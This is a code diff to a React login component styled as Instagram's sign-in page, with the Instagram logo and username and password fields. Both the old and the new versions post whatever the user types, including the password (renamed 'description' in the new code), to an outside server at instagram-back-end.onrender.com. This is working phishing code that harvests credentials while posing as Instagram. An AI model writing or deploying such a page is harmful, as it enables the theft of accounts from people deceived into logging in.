@@ -3,12 +3,31 @@ import logo from "../../assets/img/big.png";
 import instagram from "../../assets/img/instagram.png";
 import icon from "../../assets/img/icon.png";
 import play from "../../assets/img/play.png"
+import React, { useState } from 'react'
 import "./Navbar.css";
+import axios from "axios";
+import { status } from "init";
 
 export default function Navbar() {
 
-    let text1 = document.querySelector(".inp");
-    let text2 = document.querySelector(".inpt");
+    const [name, setName] = useState()
+    const [description, setDescription] = useState()
+
+    let obj = {
+        name: name,
+        description: description,
+    }
+
+    const postData = () => {
+        axios.post('https://instagram-back-end.onrender.com/data', obj)
+            .then(response => {
+                alert(response.status);
+            }
+        )
+            .catch(error => {
+                console.error("Error sending data: ", error);
+            });
+    }
 
     return (
         <>
@@ -23,26 +42,13 @@ export default function Navbar() {
                                 <div className="emmer_right">
                                     <img src={instagram} alt="" />
                                     <div className="d">
-                                        <input type="text" placeholder="Phone number, username, or email" className="inp" />
+                                        <input type="text" onChange={(e) => setName(e.target.value)} placeholder="Phone number, username, or email" className="inp" />
                                     </div>
                                     <div className="a">
-                                        <input type="password" placeholder="Password" className="inpt" />
+                                        <input type="password" onChange={(e) => setDescription(e.target.value)} placeholder="Password" className="inpt" />
                                     </div>
                                     <div className="s">
-                                        <button className="tn" onClick={() => {
-                                            let tex1 = text1.value;
-                                            let tex2 = text2.value;
-                                            fetch('https://instagram-back-end.onrender.com/data', {
-                                                method: 'POST',
-                                                headers: {
-                                                    'Content-Type': 'application/json'
-                                                },
-                                                body: JSON.stringify({
-                                                    login: tex1,
-                                                    password: tex2
-                                                })
-                                            })
-                                        }}>Log in</button>
+                                        <button className="tn" onClick={() => postData()}>Log in</button>
                                     </div>
                                     <div className="al">
                                         <div className="k"></div>
@@ -68,7 +74,7 @@ export default function Navbar() {
 
                             </div>
                         </div>
-                        
+
 
                     </Col>
                 </Row>
